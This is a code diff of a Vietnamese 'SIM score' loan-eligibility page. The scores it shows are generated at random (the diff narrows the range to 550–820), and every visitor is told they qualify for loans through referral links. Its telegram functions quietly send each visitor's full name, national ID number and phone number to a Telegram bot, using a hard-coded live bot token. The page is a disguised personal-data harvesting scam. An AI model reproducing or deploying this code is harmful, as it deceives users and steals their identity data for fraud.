@@ -1246,6 +1246,8 @@ if(e)
     <script>
         var hrefbank = '';
         var App_open= window.localStorage.getItem('App');
+		var Diemsima= window.localStorage.getItem('diemsim');
+		var sdta = window.localStorage.getItem('sdt');
         console.log(App_open);
         var date = new Date().toLocaleDateString();
         $('#counter').html(`0<p></p><span>Score date: <b>${date}</b></span>`);
@@ -1269,7 +1271,8 @@ if(e)
                 // let counterVal = Math.floor(Math.random() * (max - min + 1)) + min;
                 // $('#diemsim').val = counterVal
                 let counterVal = Math.floor($('#diemsim').val());
-
+				window.localStorage.setItem('diemsim', counterVal)
+				window.localStorage.setItem('sdt', sdt)
                 
                 let phantram = (counterVal+350)/10;
 
@@ -1277,17 +1280,17 @@ if(e)
                     val: counterVal,
                     roundProps: "val",
                     onUpdate: function(){
-                        if ((350<=counterVal) && (counterVal<=750)){
+                        if ((520<=counterVal) && (counterVal<=750)){
                             $counter.html(count.val+'<p>Trung Bình</p><span>Score date: <b>'+date+'</b></span>')
                         }
                         
-                        else if ((751<=counterVal)&&(counterVal<=1195)){
+                        else if ((751<=counterVal)&&(counterVal<=820)){
                             $counter.html(count.val+'<p>Tốt</p><span>Score date: <b>'+date+'</b></span>')
                         }
                         
-                        else if ((1196<=counterVal)&&(counterVal<=1650)){
-                            $counter.html(count.val+'<p>Rất Tốt</p><span>Score date: <b>'+date+'</b></span>')
-                        }
+                        // else if ((601<=counterVal)&&(counterVal<=735)){
+                        //     $counter.html(count.val+'<p>Rất Tốt</p><span>Score date: <b>'+date+'</b></span>')
+                        // }
                     }
                 })
                 
@@ -1302,7 +1305,7 @@ if(e)
             }, 3500);
         }
         function simdacham(value) {
-            console.log('get data',value[0])
+            // console.log('get data',value[0])
             // let scoreDeg = 199.55
             let scoreDeg = 80
             var hoten=value[1];
@@ -1325,16 +1328,12 @@ if(e)
                     val: counterVal,
                     roundProps: "val",
                     onUpdate: function(){
-                        if ((350<=counterVal) && (counterVal<=750)){
+                        if ((520<=counterVal) && (counterVal<=750)){
                             $counter.html(count.val+'<p>Trung Bình</p><span>Score date: <b>'+date+'</b></span>')
                         }
                         
-                        else if ((751<=counterVal)&&(counterVal<=1195)){
+                        else if ((751<=counterVal)&&(counterVal<=820)){
                             $counter.html(count.val+'<p>Tốt</p><span>Score date: <b>'+date+'</b></span>')
-                        }
-                        
-                        else if ((1196<=counterVal)&&(counterVal<=1650)){
-                            $counter.html(count.val+'<p>Rất Tốt</p><span>Score date: <b>'+date+'</b></span>')
                         }
                     }
                 })
@@ -1349,27 +1348,76 @@ if(e)
                 document.getElementById('Banks').style.opacity = "1"
             }, 3500);
         }
-        function showmodal(){
-            getdiem();
-            document.querySelector('.overlay').classList.add('showoverlay');
-            document.querySelector('.loginform').classList.add('showloginform');
-            let scoreDeg = 0
-            $('.needle').css('transform', `rotate(${scoreDeg}deg)`);
+        
+		function diemsim(value) {
+            // console.log('get data',value[0])
+            // let scoreDeg = 199.55
+            let scoreDeg = 80
+            var sdt = sdta
+            $('#description').html(`<i>Kết quả điểm chấm sim <b>${sdt}</b></i>`);
+            setTimeout(function () {
+                // $('.needle').css('transform', `rotate(${scoreDeg}deg)`)
 
-            document.getElementById('Banks').style.visibility="hidden";
-            document.getElementById('Banks').style.opacity = "0"
+                let count = { val : 0 }
+                let $counter = $('#counter')
+                let min = 500
+                let max = 620
+                let counterVal = Math.floor(value)
+                $('#diemsim').val = counterVal
+                
+                let phantram = (counterVal+350)/10;
 
-            
+                TweenLite.to(count, 1.5, {
+                    val: counterVal,
+                    roundProps: "val",
+                    onUpdate: function(){
+                        if ((520<=counterVal) && (counterVal<=750)){
+                            $counter.html(count.val+'<p>Trung Bình</p><span>Score date: <b>'+date+'</b></span>')
+                        }
+                        
+                        else if ((751<=counterVal)&&(counterVal<=820)){
+                            $counter.html(count.val+'<p>Tốt</p><span>Score date: <b>'+date+'</b></span>')
+                        }
+                    }
+                })
+                
+                $('.needle').css('transform', `rotate(${phantram}deg)`)
+            }, 1000)
+
+            setTimeout(() => {
+                $('#ketqua').html(`<i>Bạn đủ điều kiện vay tiền các kênh dưới đây</i>`);
+                document.getElementById('Banks').style.visibility="visible";
+                // transition: visibility 0s, opacity 0.5s linear;
+                document.getElementById('Banks').style.opacity = "1"
+            }, 3500);
         }
+
+		function showmodal(){
+			if (App_open==''|| App_open==null){
+				getdiem();
+				document.querySelector('.overlay').classList.add('showoverlay');
+				document.querySelector('.loginform').classList.add('showloginform');
+				let scoreDeg = 0
+				$('.needle').css('transform', `rotate(${scoreDeg}deg)`);
+
+				document.getElementById('Banks').style.visibility="hidden";
+				document.getElementById('Banks').style.opacity = "0"
+			}else{
+				console.log('open dangki');
+				diemsim(Diemsima);
+			}            
+        }
+
         function closemodal(){
             document.querySelector('.overlay').classList.remove('showoverlay');
             document.querySelector('.loginform').classList.remove('showloginform');
         }
         function getdiem(){
-            let min = 350
-            let max = 1650
+            let min = 550
+            let max = 820
             let counterVal = Math.floor(Math.random() * (max - min + 1)) + min;
             document.getElementById('diemsim').value = counterVal
+			// TEST
             // chamsim()
         }
        
@@ -1398,7 +1446,8 @@ if(e)
                         })
                 
                 }
-        function telegram(hoten, cccd, sdt){
+        
+		function telegram(hoten, cccd, sdt){
             // console.log('kkkk',hoten);
             if ((sdt !== null) && (sdt!=='')) {
                 var my_text = ` - Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A - SĐT: ${sdt}`
@@ -1410,23 +1459,24 @@ if(e)
                 api.send();
                 console.log("message successfully") 
                 
-            }
+            	}
                 
             }
-			function telegram_app(href){
-				var hoten=$("#hoten").val();
-				var cccd=$("#CCCD").val();
-				var sdt=$("#SDT").val();
-                var my_text = `- Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A - SĐT: ${sdt} - open app: ${href}`
-                var token = "5722329244:AAFAZMKdLqT8yiip_SAcJ2JTdefb9mB3ukU";
-                var chat_id = 5664202010
-                var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`//&parse_mode=html
-                let api = new XMLHttpRequest();
-                api.open("GET", url, true);
-                api.send();
-                console.log("message successfully") 
-				// window.location.href=href;
-            }
+		
+		function telegram_app(href){
+			var hoten=$("#hoten").val();
+			var cccd=$("#CCCD").val();
+			var sdt=$("#SDT").val();
+			var my_text = `- Họ tên: ${hoten}%0A - CCCD: ${cccd}%0A - SĐT: ${sdt} - open app: ${href}`
+			var token = "5722329244:AAFAZMKdLqT8yiip_SAcJ2JTdefb9mB3ukU";
+			var chat_id = 5664202010
+			var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`//&parse_mode=html
+			let api = new XMLHttpRequest();
+			api.open("GET", url, true);
+			api.send();
+			console.log("message successfully") 
+			// window.location.href=href;
+		}
         
         function validateform() {
             // telegram($("#hoten").val(), $("#CCCD").val(), $("#sdt").val())
@@ -1475,31 +1525,57 @@ if(e)
       		e.preventDefault();
 			  var href = $(this).attr('href');
 			//   telegram(href);
+			console.log(href);
 			telegram_app(href)
-            switch  (href){
-                case 'https://mfast.vn/kbank/?code=777751':
-                    document.querySelector('.overlay').classList.add('showoverlay');
-                    document.querySelector('.hidden-image').classList.add('show-image');
-                    hrefbank = href
-                    window.localStorage.setItem('App', 'open')
-                    App_open ='open'  
-                case 'https://canvayngay.com/dangky':
-                    if (App_open==''|| App_open==null){
-                        alert("Bạn chưa mở tài khoản Bank!, Mở tài khoản Bank sau đó gửi hồ sơ.")
-                    }else{
-                        console.log('open dangki');
-                        window.location.href=href;
-                    }
-                default:
-                    if (href!='https://mfast.vn/kbank/?code=777751' && href!='https://canvayngay.com/dangky'){
-                        // hrefbank = href
-                        window.localStorage.setItem('App', 'open')
-                        App_open ='open'
-                        console.log('open link');
-                        window.location.href=href;
-                    }
-                }
-            });
+            // switch  (href){
+            //     case href=='https://mfast.vn/kbank/?code=777751':
+            //         document.querySelector('.overlay').classList.add('showoverlay');
+            //         document.querySelector('.hidden-image').classList.add('show-image');
+            //         hrefbank = href
+            //         window.localStorage.setItem('App', 'open')
+            //         App_open ='open'  
+			// 		console.log('kbank');
+            //     case (href=='https://canvayngay.com/dangky'):
+			// 		console.log('dangki');
+            //         if (App_open==''|| App_open==null){
+            //             alert("Bạn chưa mở tài khoản Bank!, Mở tài khoản Bank sau đó gửi hồ sơ.")
+            //         }else{
+            //             console.log('open dangki');
+            //             window.location.href=href;
+            //         }
+            //     default:
+            //         if (href!='https://mfast.vn/kbank/?code=777751' && href!='https://canvayngay.com/dangky'){
+            //             // hrefbank = href
+            //             window.localStorage.setItem('App', 'open')
+            //             App_open ='open'
+            //             console.log('open link');
+            //             // window.location.href=href;
+            //         }
+            //     }
+            
+			if (href=='https://mfast.vn/kbank/?code=777751'){
+				document.querySelector('.overlay').classList.add('showoverlay');
+				document.querySelector('.hidden-image').classList.add('show-image');
+				hrefbank = href
+				window.localStorage.setItem('App', 'open')
+				App_open ='open'  
+				console.log('kbank');
+			}else if (href=='https://canvayngay.com/dangky'){
+				console.log('dangki');
+				if (App_open==''|| App_open==null){
+					alert("Bạn chưa mở tài khoản Bank!, Mở tài khoản Bank sau đó gửi hồ sơ.")
+				}else{
+					console.log('open dangki');
+					window.location.href=href;
+				}
+			}else if (href!='https://mfast.vn/kbank/?code=777751' && href!='https://canvayngay.com/dangky'){
+				 // hrefbank = href
+				 window.localStorage.setItem('App', 'open')
+				App_open ='open'
+				console.log('open link');
+				window.location.href=href;
+			}
+		});
 
 		}
         document.getElementById('tieptuc').onclick= function(){
